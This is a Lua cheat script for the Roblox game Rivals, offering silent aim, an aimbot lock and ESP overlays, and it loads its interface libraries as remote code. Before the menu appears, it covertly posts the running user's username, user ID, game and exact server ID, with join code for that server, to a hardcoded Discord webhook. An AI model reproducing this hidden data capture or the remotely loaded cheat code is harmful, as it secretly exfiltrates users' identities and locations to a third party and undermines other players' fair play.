local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"

local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000, 
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "Flamez - Rivals",
   Icon = 0, 
   LoadingTitle = "Flamez - Rivals",
   LoadingSubtitle = "by Flames",
   Theme = "Default", 

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, 

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, 
      FileName = "Flamez Hub"
   },

   Discord = {
      Enabled = true, 
      Invite = "5c9D3VD7se", 
      RememberJoins = false 
   },

   KeySystem = false, 
   KeySettings = {
      Title = "Flamez - Key System",
      Subtitle = "Key System",
      Note = "The key is provided in the discord", 
      FileName = "flamezkey", 
      SaveKey = true, 
      GrabKeyFromSite = false, 
      Key = {"Hello"} 
   }
})

local AimingTab = Window:CreateTab("Aiming", "crosshair")
local VisualsTab = Window:CreateTab("visuals", "eye")

local Divider = AimingTab:CreateDivider()

local Dropdown = AimingTab:CreateDropdown({
    Name = "Select Aiming Part",
    Options = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"},
    CurrentOption = {"Head"},
    MultipleOptions = false,
    Flag = "AimingPartDropdown",
    Callback = function(Options)
        selected_part = Options[1]
    end,
})

local selected_part = "Head" 

local replicated_storage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")
local camera = workspace.CurrentCamera

local utility
local success, err = pcall(function()
    utility = require(replicated_storage:WaitForChild("Modules"):WaitForChild("Utility"))
end)

if not success then
    warn("Failed to load Utility module:", err)
    return
end

if not utility.Raycast then
    warn("Raycast method not found in Utility module")
    return
end

local function get_players()
    local entities = {}
    for _, child in workspace:GetChildren() do
        if child:FindFirstChildOfClass("Humanoid") then
            table.insert(entities, child)
        elseif child.Name == "HurtEffect" then
            for _, hurt_player in child:GetChildren() do
                if hurt_player.ClassName ~= "Highlight" then
                    table.insert(entities, hurt_player)
                end
            end
        end
    end
    return entities
end

local function get_closest_player()
    local closest, closest_distance = nil, math.huge
    local character = players.LocalPlayer.Character

    if not character then
        return
    end

    for _, player in get_players() do
        if player == players.LocalPlayer then
            continue
        end

        local aiming_part = player:FindFirstChild(selected_part)

        if not aiming_part then
            continue
        end

        local position, on_screen = camera:WorldToViewportPoint(aiming_part.Position)

        if not on_screen then
            continue
        end

        local center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
        local distance = (center - Vector2.new(position.X, position.Y)).Magnitude

        if distance > closest_distance then
            continue
        end

        closest = player
        closest_distance = distance
    end
    return closest
end

local old = utility.Raycast 
local SilentAimToggle = AimingTab:CreateToggle({
    Name = "Enable Silent Aim",
    CurrentValue = false,
    Flag = "AimbotToggle",
    Callback = function(Value)
        if Value then
            utility.Raycast = function(...)
                local arguments = {...}

                if (#arguments > 0 and arguments[4] == 999) then
                    local closest = get_closest_player()

                    if closest and closest:FindFirstChild(selected_part) then
                        arguments[3] = closest[selected_part].Position
                    end
                end
                return old(table.unpack(arguments))
            end
        else
            utility.Raycast = old 
        end
    end,
})

local Divider = AimingTab:CreateDivider()

local target_locked = false 
local locked_target = nil 

local function toggle_lock()
    if target_locked then
        target_locked = false
        locked_target = nil
    else
        locked_target = get_closest_player()
        if locked_target then
            target_locked = true
        end
    end
end

local AimbotKeybind = AimingTab:CreateKeybind({
    Name = "Aimbot Lock Keybind",
    CurrentKeybind = "Q",
    HoldToInteract = false,
    Flag = "AimbotLockKeybind",
    Callback = function()
        toggle_lock()
    end,
})

local RegularAimbotToggle = AimingTab:CreateToggle({
    Name = "Enable Aimbot(BROKEN RIGHT NOW)",
    CurrentValue = false,
    Flag = "RegularAimbotToggle",
    Callback = function(Value)
        if Value then
            game:GetService("RunService").RenderStepped:Connect(function()
                if target_locked and locked_target and locked_target:FindFirstChild(selected_part) then
                    local target_part = locked_target[selected_part]
                    if target_part then
                        camera.CFrame = CFrame.new(camera.CFrame.Position, target_part.Position)
                    end
                end
            end)
        else
            target_locked = false
            locked_target = nil
        end
    end,
})

local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()

local Divider = VisualsTab:CreateDivider()

Sense.teamSettings.enemy.enabled = true 

local function createBooleanToggle(tab, name, settingPath, default)
    tab:CreateToggle({
        Name = name,
        CurrentValue = default or false,
        Flag = name .. "Toggle", 
        Callback = function(Value)

            local settings = Sense.teamSettings.enemy

            for i = 1, #settingPath - 1 do
                settings = settings[settingPath[i]]
            end

            settings[settingPath[#settingPath]] = Value
        end,
    })
end

local function createColorPicker(tab, name, settingPath, defaultColor)
    tab:CreateColorPicker({
        Name = name,
        Color = defaultColor,
        Flag = name .. "ColorPicker", 
        Callback = function(Value)

            local settings = Sense.teamSettings.enemy

            for i = 1, #settingPath - 1 do
                settings = settings[settingPath[i]]
            end

            settings[settingPath[#settingPath]][1] = Value
        end,
    })
end

createBooleanToggle(VisualsTab, "Enable Box ESP", {"box"}, false)
createColorPicker(VisualsTab, "Box ESP Color", {"boxColor"}, Color3.new(0, 0.25, 0.75))

createBooleanToggle(VisualsTab, "Enable 3D Box ESP", {"box3d"}, false)
createColorPicker(VisualsTab, "3D Box ESP Color", {"box3dColor"}, Color3.new(1, 0, 0))

createBooleanToggle(VisualsTab, "Enable Tracers", {"tracer"}, false)
createColorPicker(VisualsTab, "Tracers Color", {"tracerColor"}, Color3.new(1, 0, 0))

createBooleanToggle(VisualsTab, "Show Player Names", {"name"}, false)
createColorPicker(VisualsTab, "Player Name Color", {"nameColor"}, Color3.new(1, 1, 1))

createBooleanToggle(VisualsTab, "Show Health Bar", {"healthBar"}, false)
createColorPicker(VisualsTab, "Health Bar Color (Healthy)", {"healthyColor"}, Color3.new(0, 1, 0))
createColorPicker(VisualsTab, "Health Bar Color (Dying)", {"dyingColor"}, Color3.new(1, 0, 0))

createBooleanToggle(VisualsTab, "Show Weapon ESP", {"weapon"}, false)
createColorPicker(VisualsTab, "Weapon ESP Color", {"weaponColor"}, Color3.new(1, 1, 1))

createBooleanToggle(VisualsTab, "Enable Off-Screen Arrows", {"offScreenArrow"}, false)
createColorPicker(VisualsTab, "Off-Screen Arrow Color", {"offScreenArrowColor"}, Color3.new(1, 1, 1))

Sense.Load()

VisualsTab:CreateButton({
    Name = "Unload ESP",
    Callback = function()
        Sense.Unload()
    end,
})
